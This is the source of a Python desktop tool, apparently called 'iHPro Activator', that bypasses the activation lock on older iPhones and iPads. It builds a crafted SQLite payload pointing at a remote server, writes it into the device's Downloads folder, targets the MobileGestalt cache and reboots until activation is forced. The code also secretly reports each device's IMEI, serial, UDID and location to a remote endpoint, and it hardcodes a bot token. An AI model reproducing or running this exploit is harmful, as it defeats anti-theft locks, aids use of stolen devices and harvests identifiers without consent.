import sys
import os
import time
import sqlite3
import tempfile
import json
import ssl
import certifi
import urllib.request
import urllib.parse
import threading
import platform

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget,
    QVBoxLayout, QHBoxLayout, QPushButton,
    QLabel, QMessageBox, QDialog, QProgressBar,
    QFrame, QGridLayout, QCheckBox
)
from PyQt5.QtCore import QThread, pyqtSignal, QTimer, Qt
from PyQt5.QtGui import QPixmap, QIcon, QPainter, QColor, QFont, QPainterPath

# Utilisation des fonctions pymobiledevice3
from pymobiledevice3.lockdown import create_using_usbmux, lockdown_client
from pymobiledevice3.services.afc import AfcService
from pymobiledevice3.services.diagnostics import DiagnosticsService
from pymobiledevice3 import usbmux

# ========================== CONSTANTS ==========================
BACKEND_URL        = 'http://api.mobidocserver.com/iHPro_Tool_A5/A5/server.php'
VALIDATE_URL       = 'https://api.mobidocserver.com/iHPro_Tool_A5/A5/validate.php'
TELEGRAM_URL       = 'https://api.mobidocserver.com/iHPro_Tool_A5/A5/telegramreport.php'
TELEGRAM_BOT_TOKEN = '8878915882:AAHcLQFjNsEmhO8gOQ6cT4ioC9S9iualdVs'
TELEGRAM_CHAT_ID   = '1913084477'

OS_NAME = 'Windows' if sys.platform == 'win32' else ('macOS' if sys.platform == 'darwin' else 'Linux')

SUPPORTED = {
    'iPhone4,1': {'9.3.5', '9.3.6'},
    'iPad2,1':   {'8.4.1', '9.3.5'},
    'iPad2,2':   {'9.3.5', '9.3.6'},
    'iPad2,3':   {'9.3.5', '9.3.6'},
    'iPad2,4':   {'8.4.1', '9.3.5'},
    'iPad2,5':   {'8.4.1', '9.3.5'},
    'iPad2,6':   {'9.3.5', '9.3.6'},
    'iPad2,7':   {'9.3.5', '9.3.6'},
    'iPad3,1':   {'8.4.1', '9.3.5'},
    'iPad3,2':   {'9.3.5', '9.3.6'},
    'iPad3,3':   {'9.3.5', '9.3.6'},
    'iPod5,1':   {'8.4.1', '9.3.5'},
    'iPhone5,1': {'10.3.3', '10.3.4'},
    'iPhone5,2': {'10.3.3', '10.3.4'},
    'iPhone5,3': {'10.3.3', '10.3.4'},
    'iPhone5,4': {'10.3.3', '10.3.4'},
    'iPhone6,1': {'12.5.7', '12.5.8'},
    'iPad3,4':   {'10.3.3', '10.3.4'},
    'iPad3,5':   {'10.3.3', '10.3.4'},
    'iPad3,6':   {'10.3.3', '10.3.4'},
}

# ========================== UTILITY FUNCTIONS ==========================
def resource_path(name):
    base = getattr(sys, '_MEIPASS', os.path.abspath('.'))
    return os.path.join(base, name)

def send_telegram_report(device_info: dict, status: str):
    try:
        product = device_info.get('product', 'N/A')
        version = device_info.get('version', 'N/A')
        udid    = device_info.get('udid',    'N/A')
        imei    = device_info.get('imei',    'N/A')
        sn      = device_info.get('sn',      'N/A')

        ctx = ssl.create_default_context(cafile=certifi.where())

        try:
            geo_req = urllib.request.urlopen('http://ip-api.com/json/', timeout=5)
            geo     = json.loads(geo_req.read().decode())
            country = geo.get('country', 'Unknown')
            city    = geo.get('city', '')
            location = f'{city}, {country}' if city else country
        except Exception:
            location = 'Unknown'

        data = urllib.parse.urlencode({
            'status':   status,
            'product':  product,
            'sn':       sn,
            'imei':     imei,
            'version':  version,
            'udid':     udid,
            'os':       OS_NAME,
            'location': location,
        }).encode()

        urllib.request.urlopen(
            urllib.request.Request(TELEGRAM_URL, data=data, method='POST'),
            timeout=10,
            context=ctx
        )
    except Exception:
        pass

def report_async(device_info: dict, status: str):
    threading.Thread(
        target=send_telegram_report,
        args=(device_info, status),
        daemon=True
    ).start()

def build_db_from_sql(sql_path, backend_url, target_path):
    with open(sql_path, 'r', encoding='utf-8') as f:
        sql = f.read()
    sql = sql.replace('BACKEND_URL', backend_url).replace('TARGET_PATH', target_path)
    tmp = tempfile.NamedTemporaryFile(delete=False)
    tmp.close()
    try:
        con = sqlite3.connect(tmp.name)
        con.executescript(sql)
        con.commit()
        con.close()
        with open(tmp.name, 'rb') as f:
            return f.read()
    finally:
        os.unlink(tmp.name)

def check_sn_registered(sn):
    try:
        ctx = ssl.create_default_context(cafile=certifi.where())
        url = f'{VALIDATE_URL}?sn={sn}'
        req = urllib.request.urlopen(url, timeout=10, context=ctx)
        data = json.loads(req.read().decode())
        return data.get('valid', False)
    except Exception:
        return False

# ========================== CLICKABLE LABEL ==========================
class ClickableLabel(QLabel):
    clicked = pyqtSignal()

    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton:
            self.clicked.emit()
        super().mousePressEvent(event)

# ========================== SUCCESS DIALOG ==========================
class SuccessDialog(QDialog):
    def __init__(self, parent=None, device_info=None):
        super().__init__(parent)
        self.device_info = device_info or {}
        self.setWindowTitle('iHPro')
        self.setFixedSize(420, 160)
        self.setModal(True)
        self.setStyleSheet("""
            QDialog {
                background: #ffffff;
                border-radius: 12px;
                border: 1px solid #d0d8e0;
            }
            QLabel {
                color: #1e2a3a;
                background: transparent;
                border: none;
            }
            QPushButton {
                background: #0066cc;
                color: white;
                border: none;
                border-radius: 6px;
                padding: 8px 24px;
                font-weight: 600;
                font-size: 13px;
            }
            QPushButton:hover {
                background: #0052a3;
            }
            QPushButton:pressed {
                background: #003d7a;
            }
        """)

        layout = QHBoxLayout(self)
        layout.setContentsMargins(24, 24, 24, 24)
        layout.setSpacing(16)

        icon_lbl = QLabel()
        icon_lbl.setFixedSize(64, 64)
        icon_lbl.setStyleSheet('background: transparent; border: none;')
        logo_path = resource_path('logo.png')
        if os.path.exists(logo_path):
            src = QPixmap(logo_path).scaled(64, 64, Qt.KeepAspectRatio, Qt.SmoothTransformation)
            pix = QPixmap(64, 64)
            pix.fill(Qt.transparent)
            p = QPainter(pix)
            p.setRenderHint(QPainter.Antialiasing)
            path = QPainterPath()
            path.addRoundedRect(0, 0, 64, 64, 12, 12)
            p.setClipPath(path)
            p.drawPixmap(0, 0, src)
            p.end()
        else:
            pix = QPixmap(64, 64)
            pix.fill(Qt.transparent)
            p = QPainter(pix)
            p.setRenderHint(QPainter.Antialiasing)
            path = QPainterPath()
            path.addEllipse(0, 0, 64, 64)
            p.setClipPath(path)
            p.fillRect(0, 0, 64, 64, QColor('#0066cc'))
            p.setPen(QColor('white'))
            p.setFont(QFont('Arial', 20, QFont.Bold))
            p.drawText(pix.rect(), Qt.AlignCenter, 'H8')
            p.end()
        icon_lbl.setPixmap(pix)
        layout.addWidget(icon_lbl)

        right = QVBoxLayout()
        right.setSpacing(8)
        product = self.device_info.get('product', '')
        version = self.device_info.get('version', '')

        title = QLabel('Activation réussie')
        title.setStyleSheet('font-size: 16px; font-weight: bold; color: #0066cc;')
        
        msg = QLabel(f'Appareil {product} (iOS {version})\nactivé avec succès.')
        msg.setStyleSheet('font-size: 13px; color: #2a3a4a;')
        msg.setWordWrap(True)

        ok_btn = QPushButton('OK')
        ok_btn.setFixedWidth(80)
        ok_btn.clicked.connect(self.accept)

        btn_row = QHBoxLayout()
        btn_row.addStretch()
        btn_row.addWidget(ok_btn)

        right.addWidget(title)
        right.addWidget(msg)
        right.addLayout(btn_row)
        layout.addLayout(right)

# ========================== WIFI CONFIRMATION DIALOG ==========================
class WifiConfirmationDialog(QDialog):
    def __init__(self, parent=None, device_info=None):
        super().__init__(parent)
        self.device_info = device_info or {}
        self.setWindowTitle('Confirmation Wi-Fi')
        self.setFixedSize(450, 200)
        self.setModal(True)
        self.setStyleSheet("""
            QDialog {
                background: #ffffff;
                border-radius: 12px;
                border: 1px solid #d0d8e0;
            }
            QLabel {
                color: #1e2a3a;
                background: transparent;
                border: none;
            }
            QPushButton {
                background: #0066cc;
                color: white;
                border: none;
                border-radius: 6px;
                padding: 8px 24px;
                font-weight: 600;
                font-size: 13px;
            }
            QPushButton:hover {
                background: #0052a3;
            }
            QPushButton:pressed {
                background: #003d7a;
            }
            QPushButton#cancelBtn {
                background: #e8edf3;
                color: #4a5a6a;
            }
            QPushButton#cancelBtn:hover {
                background: #d0d8e0;
            }
            QCheckBox {
                color: #1e2a3a;
                font-size: 13px;
            }
            QCheckBox::indicator {
                width: 16px;
                height: 16px;
            }
        """)

        layout = QVBoxLayout(self)
        layout.setContentsMargins(28, 28, 28, 24)
        layout.setSpacing(14)

        wifi_icon = QLabel('📶')
        wifi_icon.setStyleSheet('font-size: 36px; background: transparent;')
        wifi_icon.setAlignment(Qt.AlignCenter)
        layout.addWidget(wifi_icon)

        title = QLabel('Connectez votre appareil au Wi-Fi')
        title.setStyleSheet('font-size: 15px; font-weight: bold; color: #1a2634;')
        title.setAlignment(Qt.AlignCenter)
        layout.addWidget(title)

        msg = QLabel(
            'Avant de commencer l\'activation, assurez-vous que :\n'
            '• Votre iPhone/iPad est connecté à un réseau Wi-Fi\n'
            '• L\'appareil est déverrouillé (écran allumé)\n'
            '• Le câble USB est bien connecté'
        )
        msg.setStyleSheet('font-size: 12px; color: #5a6a7a;')
        msg.setAlignment(Qt.AlignCenter)
        msg.setWordWrap(True)
        layout.addWidget(msg)

        self.checkbox = QCheckBox('J\'ai connecté mon appareil au Wi-Fi')
        self.checkbox.setStyleSheet('font-size: 13px; color: #1a2634;')
        layout.addWidget(self.checkbox)

        btn_layout = QHBoxLayout()
        btn_layout.addStretch()

        cancel_btn = QPushButton('Annuler')
        cancel_btn.setObjectName('cancelBtn')
        cancel_btn.setFixedWidth(80)
        cancel_btn.clicked.connect(self.reject)
        btn_layout.addWidget(cancel_btn)

        self.confirm_btn = QPushButton('Continuer')
        self.confirm_btn.setFixedWidth(80)
        self.confirm_btn.setEnabled(False)
        self.confirm_btn.clicked.connect(self.accept)
        btn_layout.addWidget(self.confirm_btn)

        layout.addLayout(btn_layout)

        self.checkbox.stateChanged.connect(self._on_checkbox_changed)

    def _on_checkbox_changed(self, state):
        self.confirm_btn.setEnabled(state == Qt.Checked)

# ========================== ACTIVATION THREAD ==========================
class ActivationThread(QThread):
    status  = pyqtSignal(str)
    success = pyqtSignal(str)
    error   = pyqtSignal(str)
    waiting = pyqtSignal(bool)

    def __init__(self, device_info=None):
        super().__init__()
        self._device_info = device_info or {}

    def wait_for_device(self, timeout=160):
        deadline = time.monotonic() + timeout
        first    = True
        while time.monotonic() < deadline:
            try:
                # On essaie d'abord via usbmux.list_devices pour récupérer l'UDID
                devices = usbmux.list_devices()
                if devices:
                    udid = devices[0]
                    lockdown = lockdown_client(udid=udid)
                else:
                    lockdown = create_using_usbmux()
                if not lockdown:
                    raise Exception("Aucune connexion")
                DiagnosticsService(lockdown=lockdown).mobilegestalt(keys=['ProductType'])
                if not first:
                    self.waiting.emit(False)
                    self.status.emit('Appareil reconnecté')
                return lockdown
            except Exception:
                if first:
                    self.waiting.emit(True)
                    self.status.emit('Attente de la reconnexion...')
                    first = False
                time.sleep(2)
        raise TimeoutError()

    def push_payload(self, lockdown, payload_db):
        with AfcService(lockdown=lockdown) as afc:
            try:
                for filename in afc.listdir('Downloads'):
                    try:
                        afc.rm('Downloads/' + filename)
                    except Exception:
                        pass
            except Exception:
                pass
            time.sleep(3)
            afc.set_file_contents('Downloads/downloads.28.sqlitedb', payload_db)
        DiagnosticsService(lockdown=lockdown).restart()
        return self.wait_for_device()

    def should_hactivate(self, lockdown):
        try:
            return DiagnosticsService(lockdown=lockdown).mobilegestalt(
                keys=['ShouldHactivate']
            ).get('ShouldHactivate')
        except:
            return False

    def run(self):
        try:
            # Tentative de connexion avec usbmux.list_devices d'abord
            devices = usbmux.list_devices()
            if devices:
                udid = devices[0]
                lockdown = lockdown_client(udid=udid)
            else:
                lockdown = create_using_usbmux()
            if not lockdown:
                raise Exception("Aucun appareil trouvé")
            values   = lockdown.get_value()

            if values.get('ActivationState') == 'Activated':
                self.success.emit('L\'appareil est déjà activé')
                return

            sql_path = resource_path('payload.sql')
            if not os.path.exists(sql_path):
                self.error.emit('Fichier payload.sql introuvable')
                return

            if tuple(int(x) for x in values.get('ProductVersion').split('.')) >= (10, 3):
                payload_db = build_db_from_sql(
                    sql_path, BACKEND_URL,
                    '/private/var/containers/Shared/SystemGroup/'
                    'systemgroup.com.apple.mobilegestaltcache/Library/Caches/'
                    'com.apple.MobileGestalt.plist'
                )
            else:
                payload_db = build_db_from_sql(
                    sql_path, BACKEND_URL,
                    '/private/var/mobile/Library/Caches/com.apple.MobileGestalt.plist'
                )

            self.status.emit('Activation en cours...')

            for attempt in range(5):
                lockdown = self.push_payload(lockdown, payload_db)
                delay = 15 + attempt * 5
                time.sleep(delay)

                if self.should_hactivate(lockdown):
                    DiagnosticsService(lockdown=lockdown).restart()
                    report_async(self._device_info, 'Activated ✅')
                    self.success.emit('Terminé !')
                    return

                self.status.emit(f'Nouvel essai {attempt + 1}/5')
                time.sleep(5)

            report_async(self._device_info, 'Activation Failed ❌')
            self.error.emit(
                "L'activation a échoué après plusieurs tentatives.\n"
                "Assurez-vous que l'appareil est connecté au Wi-Fi."
            )

        except TimeoutError:
            report_async(self._device_info, 'Timeout Error ⏱️')
            self.error.emit(
                "L'appareil ne s'est pas reconnecté à temps.\n"
                "Vérifiez la connexion et réessayez."
            )
        except Exception as e:
            report_async(self._device_info, f'Exception ❌')
            self.error.emit(f"Erreur: {str(e)}")

# ========================== MAIN WINDOW ==========================
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('iHPro Activator A5-A6 Bypass V1.0')
        self.setMinimumSize(620, 460)
        self.resize(650, 480)

        # ---- Image de fond ----
        self.bg_label = QLabel(self)
        self.bg_label.setGeometry(0, 0, self.width(), self.height())
        self.bg_label.setScaledContents(True)
        bg_path = resource_path('fond.png')
        if os.path.exists(bg_path):
            self.bg_label.setPixmap(QPixmap(bg_path))
        else:
            self.bg_label.setStyleSheet("background: #eef3f9;")
        self.bg_label.lower()

        # ---- Icône ----
        logo_path = resource_path('logo.png')
        if os.path.exists(logo_path):
            self.setWindowIcon(QIcon(logo_path))

        # ---- Variables ----
        self._device_info    = {}
        self._current_sn     = ''
        self._reported_udids = set()

        # ---- Widget central transparent ----
        central = QWidget()
        central.setStyleSheet("background: transparent;")
        self.setCentralWidget(central)

        # ---- Layout principal ----
        main_layout = QVBoxLayout(central)
        main_layout.setContentsMargins(30, 30, 30, 30)
        main_layout.setSpacing(16)

        # ---- Carte ----
        card = QFrame()
        card.setStyleSheet("""
            QFrame {
                background: rgba(255, 255, 255, 0.92);
                border-radius: 16px;
                border: 1px solid rgba(200, 210, 220, 0.5);
            }
        """)
        main_layout.addWidget(card)

        card_layout = QVBoxLayout(card)
        card_layout.setContentsMargins(28, 28, 28, 28)
        card_layout.setSpacing(14)

        # ---- En-tête ----
        header = QHBoxLayout()
        header.setSpacing(14)

        logo_lbl = QLabel()
        logo_lbl.setFixedSize(42, 42)
        logo_lbl.setStyleSheet('background: transparent;')
        if os.path.exists(logo_path):
            pix = QPixmap(logo_path).scaled(42, 42, Qt.KeepAspectRatio, Qt.SmoothTransformation)
            logo_lbl.setPixmap(pix)
        else:
            logo_lbl.setText('📱')
            logo_lbl.setStyleSheet('font-size: 30px; background: transparent;')
        header.addWidget(logo_lbl)

        title_lbl = QLabel('iHPro Activator')
        title_lbl.setStyleSheet('font-size: 20px; font-weight: 600; color: #1a2634; background: transparent;')
        header.addWidget(title_lbl)
        header.addStretch()

        ver_lbl = QLabel('v1.0')
        ver_lbl.setStyleSheet('''
            font-size: 11px; 
            color: #6a7a8a; 
            background: #f0f4f8; 
            padding: 4px 12px; 
            border-radius: 10px;
        ''')
        header.addWidget(ver_lbl)
        card_layout.addLayout(header)

        # ---- Séparateur ----
        sep = QFrame()
        sep.setFrameShape(QFrame.HLine)
        sep.setStyleSheet('background: #e8edf3; max-height: 1px;')
        card_layout.addWidget(sep)

        # ---- Grille d'informations ----
        grid = QGridLayout()
        grid.setHorizontalSpacing(16)
        grid.setVerticalSpacing(10)

        val_style = '''
            QLabel {
                background: #f7f9fc;
                padding: 6px 12px;
                border-radius: 6px;
                border: 1px solid #e8edf3;
                color: #1a2634;
                font-size: 13px;
            }
        '''
        lbl_style = '''
            QLabel {
                background: transparent;
                color: #5a6a7a;
                font-weight: 500;
                font-size: 13px;
            }
        '''

        self.lbl_uuid   = QLabel('')
        self.lbl_device = QLabel('')
        self.lbl_ecid   = QLabel('')
        self.lbl_imei   = QLabel('')
        self.lbl_sn     = ClickableLabel('')
        self.lbl_sn.clicked.connect(self._copy_sn)
        self.lbl_sn.setToolTip('Cliquez pour copier le numéro de série')

        for lbl in (self.lbl_uuid, self.lbl_device, self.lbl_ecid, self.lbl_imei, self.lbl_sn):
            lbl.setStyleSheet(val_style)
            lbl.setWordWrap(True)

        grid.addWidget(QLabel('APP_UUID :'), 0, 0, Qt.AlignRight)
        grid.addWidget(self.lbl_uuid, 0, 1)
        grid.addWidget(QLabel('Appareil :'), 1, 0, Qt.AlignRight)
        grid.addWidget(self.lbl_device, 1, 1)
        grid.addWidget(QLabel('ECID :'), 2, 0, Qt.AlignRight)
        grid.addWidget(self.lbl_ecid, 2, 1)
        grid.addWidget(QLabel('IMEI :'), 3, 0, Qt.AlignRight)
        grid.addWidget(self.lbl_imei, 3, 1)
        grid.addWidget(QLabel('S/N :'), 4, 0, Qt.AlignRight)
        grid.addWidget(self.lbl_sn, 4, 1)

        for i in range(grid.rowCount()):
            item = grid.itemAtPosition(i, 0)
            if item:
                w = item.widget()
                if w:
                    w.setStyleSheet(lbl_style)

        card_layout.addLayout(grid)

        # ---- Barre de progression ----
        self.progress = QProgressBar()
        self.progress.setRange(0, 100)
        self.progress.setValue(0)
        self.progress.setVisible(False)
        self.progress.setStyleSheet('''
            QProgressBar {
                border: 1px solid #e0e8f0;
                border-radius: 6px;
                background: #f7f9fc;
                height: 20px;
                text-align: center;
                color: #1a2634;
                font-weight: 500;
                font-size: 12px;
            }
            QProgressBar::chunk {
                background: #0066cc;
                border-radius: 6px;
            }
        ''')
        self.progress.setFormat('%p%')
        card_layout.addWidget(self.progress)

        # ---- Statut ----
        self.status = QLabel('Aucun appareil connecté')
        self.status.setAlignment(Qt.AlignCenter)
        self.status.setStyleSheet('''
            QLabel {
                background: #f7f9fc;
                border: 1px solid #e8edf3;
                border-radius: 6px;
                padding: 10px;
                color: #5a6a7a;
                font-weight: 500;
                font-size: 13px;
            }
        ''')
        card_layout.addWidget(self.status)

        # ---- Bouton d'activation ----
        btn_layout = QHBoxLayout()
        btn_layout.setSpacing(10)

        self.activate = QPushButton('Activer l\'appareil')
        self.activate.setEnabled(False)
        self.activate.setStyleSheet('''
            QPushButton {
                background: #b0b8c4;
                color: white;
                border: none;
                border-radius: 8px;
                padding: 12px;
                font-weight: 600;
                font-size: 14px;
            }
            QPushButton:enabled {
                background: #0066cc;
            }
            QPushButton:enabled:hover {
                background: #0052a3;
            }
            QPushButton:enabled:pressed {
                background: #003d7a;
            }
            QPushButton:disabled {
                background: #c8d0d8;
                color: #8a9aa8;
            }
        ''')
        self.activate.clicked.connect(self.start_activation)
        btn_layout.addWidget(self.activate)

        # Bouton Rafraîchir
        self.refresh_btn = QPushButton('🔄')
        self.refresh_btn.setFixedSize(40, 40)
        self.refresh_btn.setStyleSheet('''
            QPushButton {
                background: #f0f4f8;
                border: 1px solid #d0d8e0;
                border-radius: 8px;
                font-size: 16px;
            }
            QPushButton:hover {
                background: #e0e8f0;
            }
        ''')
        self.refresh_btn.clicked.connect(self.poll_device)
        self.refresh_btn.setToolTip('Rafraîchir la détection')
        btn_layout.addWidget(self.refresh_btn)

        card_layout.addLayout(btn_layout)

        # ---- Timers ----
        self._progress_timer = QTimer(self)
        self._progress_timer.timeout.connect(self._tick_progress)
        self._progress_val = 0

        self.timer = QTimer(self)
        self.timer.timeout.connect(self.poll_device)
        self.timer.start(1000)

    # Redimensionnement de l'image de fond
    def resizeEvent(self, event):
        self.bg_label.setGeometry(0, 0, self.width(), self.height())
        super().resizeEvent(event)

    # ---------- Copy SN ----------
    def _copy_sn(self):
        if self._current_sn:
            QApplication.clipboard().setText(self._current_sn)
            self.lbl_sn.setStyleSheet('''
                QLabel {
                    background: #e6f0ff;
                    padding: 6px 12px;
                    border-radius: 6px;
                    border: 1px solid #0066cc;
                    color: #0066cc;
                    font-size: 13px;
                    font-weight: 600;
                }
            ''')
            self.status.setText(f'S/N copié : {self._current_sn}')
            self.status.setVisible(True)
            QTimer.singleShot(2000, lambda: self.lbl_sn.setStyleSheet('''
                QLabel {
                    background: #f7f9fc;
                    padding: 6px 12px;
                    border-radius: 6px;
                    border: 1px solid #e8edf3;
                    color: #1a2634;
                    font-size: 13px;
                }
            '''))
            QTimer.singleShot(2000, lambda: self.status.setVisible(False))

    # ---------- Device polling (détection améliorée) ----------
    def poll_device(self):
        try:
            print("🔍 Tentative de détection...")
            # Utiliser usbmux.list_devices() pour lister les appareils
            devices = usbmux.list_devices()
            print(f"Devices found: {devices}")
            if not devices:
                self._clear_info()
                self._set_state('Aucun appareil connecté (aucun device listé)', False)
                return

            # Prendre le premier UDID
            udid = devices[0]
            print(f"UDID: {udid}")

            # Connexion via lockdown_client avec l'UDID
            try:
                lockdown = lockdown_client(udid=udid)
            except Exception as e:
                print(f"Erreur lockdown_client: {e}")
                # Fallback sur create_using_usbmux()
                lockdown = create_using_usbmux()

            if not lockdown:
                self._clear_info()
                self._set_state('Impossible de se connecter à l\'appareil', False)
                return

            values = lockdown.get_value()
            product = values.get('ProductType', '')
            version = values.get('ProductVersion', '')
            udid    = lockdown.udid or ''
            imei    = values.get('InternationalMobileEquipmentIdentity', '')
            sn      = values.get('SerialNumber', '')

            try:
                diag     = DiagnosticsService(lockdown=lockdown)
                mg       = diag.mobilegestalt(keys=['UniqueDeviceID'])
                app_uuid = mg.get('UniqueDeviceID', '') or udid
            except Exception:
                app_uuid = udid

            try:
                chip_id = lockdown.get_value(key='UniqueChipID')
                if isinstance(chip_id, int):
                    ecid = hex(chip_id).upper().replace('0X', '')
                else:
                    ecid = str(chip_id)
            except Exception:
                ecid = udid

            is_supported = SUPPORTED.get(product)
            if not is_supported:
                self._clear_info()
                self._set_state(f'Appareil non supporté : {product}', False)
                return

            if version not in is_supported:
                self._clear_info()
                self._set_state(f'Version iOS {version} non supportée', False)
                return

            self._device_info = {
                'product': product,
                'version': version,
                'udid':    udid,
                'imei':    imei,
                'sn':      sn,
                'ecid':    ecid,
            }
            self._current_sn = sn

            if udid and udid not in self._reported_udids:
                self._reported_udids.add(udid)
                report_async(self._device_info, 'Device Connected 🔌')

            self.lbl_uuid.setText(app_uuid)
            self.lbl_device.setText(f'{product}  •  iOS {version}')
            self.lbl_ecid.setText(ecid)
            self.lbl_imei.setText(imei)
            self.lbl_sn.setText(f'{sn}  (cliquez pour copier)')
            self.status.setVisible(False)
            self.activate.setEnabled(True)

        except Exception as e:
            print(f"Erreur poll_device: {e}")
            import traceback
            traceback.print_exc()
            self._clear_info()
            self._set_state(f'Erreur: {e}', False)

    def _clear_info(self):
        self._device_info = {}
        self._current_sn  = ''
        self.lbl_uuid.setText('')
        self.lbl_device.setText('')
        self.lbl_ecid.setText('')
        self.lbl_imei.setText('')
        self.lbl_sn.setText('')

    def _set_state(self, text, enabled):
        self.status.setText(text)
        self.status.setVisible(True)
        self.activate.setEnabled(enabled)

    # ---------- Progress simulation ----------
    def _tick_progress(self):
        if self._progress_val < 90:
            self._progress_val += 2
            self.progress.setValue(self._progress_val)

    def _on_activation_status(self, msg):
        self.status.setText(msg)

    def _on_waiting(self, waiting: bool):
        if waiting:
            self._progress_timer.stop()
            self.progress.setRange(0, 0)
            self.progress.setFormat('Attente...')
        else:
            self.progress.setRange(0, 100)
            self.progress.setValue(self._progress_val)
            self.progress.setFormat('%p%')
            self._progress_timer.start(600)

    # ---------- Start activation ----------
    def start_activation(self):
        product = self._device_info.get('product', '')
        version = self._device_info.get('version', '')

        if product not in SUPPORTED or version not in SUPPORTED.get(product, set()):
            QMessageBox.critical(self, 'Non supporté',
                                 f"L'appareil {product} sous iOS {version} n'est pas supporté.")
            return

        wifi_dialog = WifiConfirmationDialog(self, self._device_info)
        if wifi_dialog.exec_() != QDialog.Accepted:
            self.status.setText('Activation annulée')
            self.status.setVisible(True)
            return

        self.status.setText('Vérification du numéro de série...')
        self.status.setVisible(True)
        QApplication.processEvents()

        if not check_sn_registered(self._current_sn):
            dlg = QDialog(self)
            dlg.setWindowTitle('Appareil supporté')
            dlg.setFixedWidth(420)
            dlg.setModal(True)
            dlg.setStyleSheet('''
                QDialog {
                    background: #ffffff;
                    border-radius: 12px;
                    border: 1px solid #d0d8e0;
                }
                QLabel {
                    color: #1a2634;
                }
                QPushButton {
                    background: #0066cc;
                    color: white;
                    border: none;
                    border-radius: 6px;
                    padding: 8px 24px;
                    font-weight: 600;
                    font-size: 13px;
                }
                QPushButton:hover {
                    background: #0052a3;
                }
            ''')
            dlg_layout = QVBoxLayout(dlg)
            dlg_layout.setContentsMargins(28, 28, 28, 24)
            dlg_layout.setSpacing(12)

            lbl_title = QLabel(f'✅ {product} (iOS {version}) est supporté !')
            lbl_title.setStyleSheet('font-size: 15px; font-weight: bold; color: #0066cc;')
            lbl_title.setWordWrap(True)

            lbl_sn = QLabel(f'Numéro de série : <b>{self._current_sn}</b>')
            lbl_sn.setStyleSheet('font-size: 13px;')

            lbl_msg = QLabel('Veuillez enregistrer ce numéro sur :')
            lbl_msg.setStyleSheet('font-size: 13px; color: #5a6a7a;')

            lbl_link = QLabel('<a href="https://frpkingdigitalstore.com" style="color: #0066cc; text-decoration: none; font-weight: 600;">frpkingdigitalstore.com</a>')
            lbl_link.setOpenExternalLinks(True)
            lbl_link.setStyleSheet('font-size: 13px;')

            btn_ok = QPushButton('OK')
            btn_ok.setFixedWidth(80)
            btn_ok.clicked.connect(dlg.accept)

            btn_row = QHBoxLayout()
            btn_row.addStretch()
            btn_row.addWidget(btn_ok)

            dlg_layout.addWidget(lbl_title)
            dlg_layout.addWidget(lbl_sn)
            dlg_layout.addWidget(lbl_msg)
            dlg_layout.addWidget(lbl_link)
            dlg_layout.addSpacing(6)
            dlg_layout.addLayout(btn_row)
            dlg.exec_()
            self.status.setVisible(False)
            return

        self.timer.stop()
        self.activate.setEnabled(False)
        self.refresh_btn.setEnabled(False)
        self.progress.setVisible(True)
        self.progress.setRange(0, 100)
        self.progress.setValue(0)
        self.progress.setFormat('%p%')
        self.status.setVisible(True)
        self.status.setText('Démarrage de l\'activation...')

        self._progress_val = 0
        self._progress_timer.start(600)

        self.worker = ActivationThread(device_info=self._device_info)
        self.worker.status.connect(self._on_activation_status)
        self.worker.waiting.connect(self._on_waiting)
        self.worker.success.connect(self.on_success)
        self.worker.error.connect(self.on_error)
        self.worker.start()

    def on_success(self, msg):
        self._progress_timer.stop()
        self.progress.setRange(0, 100)
        self.progress.setValue(100)
        self.progress.setFormat('✅ %p%')
        self.status.setText('Activation réussie !')
        
        dlg = SuccessDialog(self, device_info=self._device_info)
        dlg.exec_()
        self.progress.setVisible(False)
        self.status.setVisible(False)
        self.activate.setEnabled(True)
        self.refresh_btn.setEnabled(True)
        self.timer.start(1000)

    def on_error(self, msg):
        self._progress_timer.stop()
        self.progress.setRange(0, 100)
        self.progress.setVisible(False)
        QMessageBox.critical(self, 'Erreur', f"L'activation a échoué.\n\n{msg}")
        self.status.setText('Erreur')
        self.status.setVisible(True)
        self.activate.setEnabled(False)
        self.refresh_btn.setEnabled(True)
        self.timer.start(1000)

# ========================== ENTRY POINT ==========================
if __name__ == '__main__':
    app = QApplication(sys.argv)
    app.setFont(QFont('Helvetica', 10))
    
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
